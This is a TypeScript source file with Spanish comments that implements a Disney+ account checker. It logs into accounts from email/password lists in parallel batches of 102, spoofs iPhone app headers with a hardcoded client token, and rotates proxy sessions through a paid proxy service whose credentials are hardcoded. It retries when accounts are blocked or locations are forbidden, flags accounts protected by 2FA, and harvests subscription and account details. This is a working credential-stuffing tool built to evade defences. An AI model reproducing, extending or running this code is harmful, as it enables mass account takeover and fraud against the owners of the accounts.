import axios, { AxiosResponse } from 'axios-https-proxy-fix';
import crypto from 'crypto';

interface CheckResponse {
  success: boolean;
  error?: string;
  details?: {
    subscription?: string;
    subType?: string;
    description?: string;
    expireDate?: string;
    nextRenewalDate?: string;
    freeTrial?: string;
    lastConnection?: string;
    voucherCode?: string;
    earlyAccess?: string;
    emailVerified?: boolean;
    securityFlagged?: boolean;
    country?: string;
    maxProfiles?: number;
    userVerified?: boolean;
    email?: string;
    createdAt?: string;
  };
}

export class DisneyAPI {
  private baseUrl: string;
  private headers: Record<string, string>;
  private sessionId: string;
  private static readonly ZONE_ID = "D236A4F1";
  private static readonly API_KEY = "14245A8F44ED4115ACAAE40E026D7D67";
  private static readonly SHOW_LOGS = true;
  private static readonly BATCH_SIZE = 102;

  constructor() {
    this.baseUrl = 'https://global.edge.bamgrid.com';
    this.headers = {
      'User-Agent': 'Disney+/23962 CFNetwork/978.0.7 Darwin/18.7.0',
      'X-BAMSDK-Platform': 'iPhone7,2',
      'Accept': 'application/json',
      'X-BAMSDK-Client-ID': 'disney-svod-3d9324fc',
      'X-BAMSDK-Version': '9.9.2',
      'X-DSS-Edge-Accept': 'vnd.dss.edge+json; version=1',
      'Accept-Language': 'en-us',
      'Accept-Encoding': 'gzip, deflate',
      'Connection': 'close'
    };
    this.sessionId = this.generateSessionId();
  }

  private generateSessionId(): string {
    return crypto.randomBytes(16).toString('hex');
  }

  private getProxyConfig() {
    return {
      proxy: {
        host: "proxy.bytio.com",
        port: 8080,
        auth: {
          username: `zone-${DisneyAPI.ZONE_ID}-session-${this.sessionId}`,
          password: DisneyAPI.API_KEY
        }
      }
    };
  }

  private log(...args: any[]) {
    if (DisneyAPI.SHOW_LOGS) {
      console.log(...args);
    }
  }

  private async makeRequest(config: any, retryCount = 0): Promise<AxiosResponse> {
    try {
      this.log(`🔄 Haciendo petición a: ${config.url}`);
      this.log('📝 Headers:', JSON.stringify(config.headers, null, 2));
      this.log('📦 Data:', config.data);

      const response = await axios({
        ...config,
        ...this.getProxyConfig(),
        headers: {
          ...this.headers,
          ...config.headers
        }
      });

      this.log(`✅ Respuesta recibida de ${config.url}`);
      this.log('📊 Status:', response.status);
      this.log('📄 Data:', JSON.stringify(response.data, null, 2));

      return response;
    } catch (error: any) {
      this.log(`❌ Error en petición a ${config.url}:`, error.message);
      this.log('📊 Status:', error.response?.status);
      this.log('📄 Error Data:', JSON.stringify(error.response?.data, null, 2));

      // Detectar cuenta con posible 2FA y reintentar una vez
      if (error.response?.status === 401 && 
          error.response?.data?.errors?.[0]?.description?.includes('has been blocked')) {
        if (retryCount === 0) {
          this.log('🔄 Cuenta bloqueada, reintentando una vez más...');
          this.sessionId = this.generateSessionId();
          await new Promise(resolve => setTimeout(resolve, 2000)); // Esperar 2 segundos antes de reintentar
          return this.makeRequest(config, retryCount + 1);
        } else {
          // Si ya se reintentó y sigue bloqueada, entonces sí es 2FA
          throw new Error('2FA activo');
        }
      }

      // Manejar error de ubicación prohibida
      if (error.response?.status === 400 && 
          error.response?.data?.error_description === "forbidden-location") {
        this.log('🔄 Ubicación bloqueada, intentando con nueva sesión...');
        this.sessionId = this.generateSessionId();
        // Aumentar el tiempo de espera entre reintentos
        await new Promise(resolve => setTimeout(resolve, (retryCount + 1) * 1000));
        return this.makeRequest(config, retryCount + 1);
      }

      // Manejar error de sesión no disponible
      if (error.response?.status === 404 && retryCount < 3) {
        this.log('🔄 Sesión no disponible, generando nueva sesión...');
        this.sessionId = this.generateSessionId();
        return this.makeRequest(config, retryCount + 1);
      }

      // Manejar errores de validación
      if (error.response?.status === 400 && error.response?.data?.errors) {
        const errorMessage = error.response.data.errors.map((e: any) => e.description || e.code).join(', ');
        throw new Error(`Error de validación: ${errorMessage}`);
      }

      throw error;
    }
  }

  async checkAccount(email: string, password: string): Promise<CheckResponse> {
    try {
      this.log('🔄 Iniciando verificación de cuenta Disney+ para:', email);

      // Paso 1: Obtener el primer token
      const deviceResponse = await this.makeRequest({
        method: 'post',
        url: `${this.baseUrl}/devices`,
        data: {
          deviceFamily: "application",
          applicationRuntime: "iPhone7,2",
          deviceProfile: "iPhone7,2",
          attributes: {}
        },
        headers: {
          'Authorization': 'Bearer ZGlzbmV5JmFwcGxlJjEuMC4w.H9L7eJvc2oPYwDgmkoar6HzhBJRuUUzt_PcaC3utBI4',
          'X-BAMSDK-Transaction-ID': crypto.randomUUID(),
          'Content-Type': 'application/json'
        }
      });

      if (!deviceResponse.data.assertion) {
        throw new Error('No se pudo obtener el token de dispositivo');
      }

      const token1 = deviceResponse.data.assertion;
      this.log('✅ Token de dispositivo obtenido');

      // Paso 2: Intercambiar token1 por token2
      const tokenResponse = await this.makeRequest({
        method: 'post',
        url: `${this.baseUrl}/token`,
        data: `platform=iphone&grant_type=urn:ietf:params:oauth:grant-type:token-exchange&subject_token=${token1}&subject_token_type=urn:bamtech:params:oauth:token-type:device`,
        headers: {
          'Authorization': 'Bearer ZGlzbmV5JmFwcGxlJjEuMC4w.H9L7eJvc2oPYwDgmkoar6HzhBJRuUUzt_PcaC3utBI4',
          'Content-Type': 'application/x-www-form-urlencoded',
          'X-BAMSDK-Transaction-ID': crypto.randomUUID()
        }
      });

      if (!tokenResponse.data.access_token) {
        throw new Error('No se pudo obtener el token de acceso');
      }

      const token2 = tokenResponse.data.access_token;
      this.log('✅ Token de acceso obtenido');

      // Paso 3: Intentar login
      const loginResponse = await this.makeRequest({
        method: 'post',
        url: `${this.baseUrl}/idp/login`,
        data: { email, password },
        headers: {
          'Authorization': `Bearer ${token2}`,
          'X-BAMSDK-Transaction-ID': crypto.randomUUID(),
          'Content-Type': 'application/json'
        }
      });

      if (!loginResponse.data.id_token) {
        return {
          success: false,
          error: 'Credenciales inválidas'
        };
      }

      this.log('✅ Login exitoso');

      // Paso 4: Obtener token3
      const grantResponse = await this.makeRequest({
        method: 'post',
        url: `${this.baseUrl}/accounts/grant`,
        data: { id_token: loginResponse.data.id_token },
        headers: {
          'Authorization': `Bearer ${token2}`,
          'X-BAMSDK-Transaction-ID': crypto.randomUUID(),
          'Content-Type': 'application/json'
        }
      });

      if (!grantResponse.data.assertion) {
        throw new Error('No se pudo obtener el token de cuenta');
      }

      const token3 = grantResponse.data.assertion;
      this.log('✅ Token de cuenta obtenido');

      // Paso 5: Obtener token final
      const finalTokenResponse = await this.makeRequest({
        method: 'post',
        url: `${this.baseUrl}/token`,
        data: `grant_type=urn:ietf:params:oauth:grant-type:token-exchange&latitude=0&longitude=0&platform=browser&subject_token=${token3}&subject_token_type=urn:bamtech:params:oauth:token-type:account`,
        headers: {
          'Authorization': 'Bearer ZGlzbmV5JmFwcGxlJjEuMC4w.H9L7eJvc2oPYwDgmkoar6HzhBJRuUUzt_PcaC3utBI4',
          'Content-Type': 'application/x-www-form-urlencoded',
          'X-BAMSDK-Transaction-ID': crypto.randomUUID()
        }
      });

      if (!finalTokenResponse.data.access_token) {
        throw new Error('No se pudo obtener el token final');
      }

      const finalToken = finalTokenResponse.data.access_token;
      this.log('✅ Token final obtenido');

      // Paso 6: Obtener información de la cuenta
      const accountResponse = await this.makeRequest({
        method: 'get',
        url: `${this.baseUrl}/accounts/me`,
        headers: {
          'Authorization': `Bearer ${finalToken}`
        }
      });

      // Paso 7: Obtener información de suscripción
      const subscriptionResponse = await this.makeRequest({
        method: 'get',
        url: `${this.baseUrl}/subscriptions`,
        headers: {
          'Authorization': `Bearer ${finalToken}`
        }
      });

      // Si no hay suscripciones, la cuenta es free
      if (!subscriptionResponse.data || subscriptionResponse.data.length === 0) {
        return {
          success: true,
          details: {
            subscription: 'FREE',
            emailVerified: accountResponse.data.attributes.emailVerified,
            securityFlagged: accountResponse.data.attributes.securityFlagged,
            country: accountResponse.data.attributes.locations?.registration?.geoIp?.country || 'Unknown',
            maxProfiles: accountResponse.data.attributes.maxNumberOfProfilesAllowed,
            userVerified: accountResponse.data.attributes.userVerified,
            email: accountResponse.data.attributes.email,
            createdAt: accountResponse.data.attributes.dssIdentityCreatedAt
          }
        };
      }

      // Extraer información de la suscripción
      const subscription = subscriptionResponse.data[0];
      return {
        success: true,
        details: {
          subscription: subscription.name,
          subType: subscription.subType,
          description: subscription.desc,
          expireDate: subscription.expirationDate,
          nextRenewalDate: subscription.nextRenewalDate,
          freeTrial: subscription.freeTrial?.status,
          lastConnection: subscription.lastSyncDate,
          voucherCode: subscription.voucherCode,
          earlyAccess: subscription.earlyAccess,
          emailVerified: accountResponse.data.emailVerified,
          securityFlagged: accountResponse.data.securityFlagged,
          country: accountResponse.data.country
        }
      };

    } catch (error: any) {
      this.log('❌ Error en la verificación:', error.message);
      this.log('Stack trace:', error.stack);

      // Manejar específicamente el error de 2FA
      if (error.message === '2FA activo') {
        return {
          success: false,
          error: '2FA activo'
        };
      }

      return {
        success: false,
        error: error.message || 'Error al verificar la cuenta'
      };
    }
  }

  // Método para verificar múltiples cuentas en paralelo
  async checkMultipleAccounts(accounts: { email: string, password: string }[]): Promise<CheckResponse[]> {
    const results: CheckResponse[] = [];
    
    for (let i = 0; i < accounts.length; i += DisneyAPI.BATCH_SIZE) {
      const batch = accounts.slice(i, i + DisneyAPI.BATCH_SIZE);
      const promises = batch.map(account => {
        // Crear una nueva instancia para cada verificación para evitar conflictos
        const api = new DisneyAPI();
        return api.checkAccount(account.email, account.password)
          .catch(error => ({
            success: false,
            error: error.message === '2FA activo' ? '2FA activo' : (error.message || 'Error al verificar la cuenta')
          }));
      });
      
      const batchResults = await Promise.all(promises);
      results.push(...batchResults);

      // Pequeña pausa entre lotes para evitar sobrecarga
      if (i + DisneyAPI.BATCH_SIZE < accounts.length) {
        await new Promise(resolve => setTimeout(resolve, 500));
      }
    }
    
    return results;
  }

  // Método estático para facilitar el uso
  static async checkBatch(accounts: { email: string, password: string }[]): Promise<CheckResponse[]> {
    const api = new DisneyAPI();
    return api.checkMultipleAccounts(accounts);
  }
} 